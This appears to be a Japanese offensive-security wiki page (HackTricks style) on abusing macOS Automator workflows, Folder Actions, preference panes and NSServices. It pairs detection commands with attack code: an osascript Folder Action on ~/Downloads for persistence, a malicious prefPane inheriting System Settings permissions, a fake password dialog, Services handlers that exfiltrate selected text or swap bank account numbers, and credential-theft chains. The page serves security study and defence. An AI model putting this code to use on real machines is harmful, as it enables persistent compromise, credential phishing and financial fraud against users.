# macOS Automator、Preference Panes & NSServices の悪用

{{#include ../../../banners/hacktricks-training.md}}

## Automator アクションとワークフロー

### 基本情報

**Automator** は macOS の視覚的な自動化ツールです。**workflows**（`.workflow` バンドル）で構成される **actions**（`.action` バンドル）を実行します。Automator は **Folder Actions**、**Quick Actions**、および **Shortcuts** との統合も提供します。

Automator アクションは、ワークフロー実行時に Automator ランタイムに読み込まれる **プラグイン** です。これらは次のことができます:
- 任意の shell スクリプトを実行する
- ファイルやデータを処理する
- AppleScript を使ってアプリと対話する
- 複雑な自動化のために連結する

### なぜ重要か

> [!WARNING]
> Automator のワークフローは、単純なドキュメントファイルのように見えるため、実行されるように **social-engineered** される可能性があります。`.workflow` バンドルは、ワークフロー実行時に実行される埋め込みの shell コマンドを含めることができます。Folder Actions と組み合わせることで、ファイルイベントでトリガーされる **自動的な永続化** を提供します。

### 発見
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### 攻撃: ソーシャルエンジニアリングされたワークフロー

`.workflow` バンドルは、ほとんどのユーザーには通常のドキュメントファイルのように見えます:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions は、監視フォルダにファイルが追加されると自動的にワークフローを実行します:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions は再起動後も持続し、静かに実行されます。`~/Downloads` に Folder Action があるということは、**ダウンロードされるすべてのファイルがあなたの payload をトリガーする** ということです — Safari、Chrome、AirDrop、メール添付ファイルからのファイルを含みます。
> 
> ---

## 環境設定ペイン

### 基本情報

Preference panes（`.prefPane` バンドル）は **System Settings**（旧 System Preferences）に読み込まれるプラグインです。システムやサードパーティ機能の設定用UIパネルを提供します。

### なぜ重要か

- Preference panes は **System Settings プロセス内で実行** され、**TCC の高い権限**（accessibility、full disk access の場合がある）を持つことがあります
- サードパーティの preference panes はこの信頼されたプロセスに読み込まれ、**そのセキュリティコンテキストを継承** します
- ユーザは preference panes を **ダブルクリック** してインストールするため、ソーシャルエンジニアリングが容易です
- 一度インストールされると、それらは **永続化され**、System Settings がそのパネルを開くたびに読み込まれます

### 検出
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

悪意のある preference pane は System Settings のセキュリティコンテキストを継承します:
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside System Settings process
// It has System Settings' TCC permissions

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### 攻撃: インストールによる永続化
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attack: UI Phishing

プリファレンスペインは正規のシステムUIパネルを模倣して **phish for credentials**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### 基本情報

**NSServices** は、アプリケーションが **Services menu**（右クリック → Services）を介して他のアプリに機能を提供することを可能にします。ユーザーがテキストやデータを選択してサービスを起動すると、選択されたデータは処理のために**サービス提供者に送信されます**。

Services はアプリケーションの `Info.plist` 内の `NSServices` キーで宣言され、pasteboard サーバー（`pbs`）に登録されます。

### なぜ重要か

- Services は **アプリ間のデータフロー** を受け取る — 任意のアプリから選択されたテキストがサービスに送られる
- 悪意あるサービスはパスワードマネージャ、メールクライアント、金融アプリからデータを傍受する
- Services は呼び出し元のアプリに**変更されたデータを返す**ことができる（選択操作に対する man-in-the-middle）
- サービス名は正当なものに見せかけるように作成できる（"Format Text", "Encrypt Selection", "Share"）

### 発見
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### 攻撃: データ傍受サービス
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Attack: Data Modification (Man-in-the-Middle)

サービスは正当な機能を提供しているように見せかけながら、**返されるデータを改ざんする**ことができます:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
---

## 技術横断型攻撃チェーン

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### 環境設定ペイン → TCC 権限昇格
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane runs inside System Settings context
4. Inherits System Settings' TCC grants
5. Access protected data, control other apps via inherited Accessibility
```
### NSService → Password Manager の窃取
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## 参考文献

* [Apple Developer — Automator Programming Guide](https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/AutomatorConcepts/Automator.html)
* [Apple Developer — Preference Pane Programming Guide](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/PreferencePanes/Introduction/Introduction.html)
* [Apple Developer — Services Implementation Guide](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/SysServices/introduction.html)
* [Objective-See — Folder Action Persistence](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
